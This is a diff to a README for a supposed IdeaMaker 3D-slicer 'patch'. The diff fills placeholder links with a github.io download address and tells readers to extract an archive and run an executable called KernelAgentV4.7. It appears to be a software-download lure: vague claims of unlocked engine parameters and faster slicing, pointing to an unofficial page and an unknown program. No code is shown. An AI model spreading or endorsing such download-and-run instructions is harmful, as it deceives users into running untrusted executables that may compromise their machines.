@@ -2,13 +2,15 @@
 
 This patch improves IdeaMaker by fixing profile errors, unlocking hidden engine parameters, and boosting slicing speed across all printer types using `KernelAgentV4.7`.
 
-[![Download IdeaMaker Patch](https://img.shields.io/badge/Download-IdeaMaker_SlicingFix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download IdeaMaker Patch](https://img.shields.io/badge/Download-IdeaMaker_SlicingFix-blueviolet)](https://ideamaker-3d-slicer-optimizer-patch.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ideamaker-3d-slicer-optimizer-patch.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\IdeaMakerPatch`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will auto-detect your installed IdeaMaker version and optimize its settings and profiles  
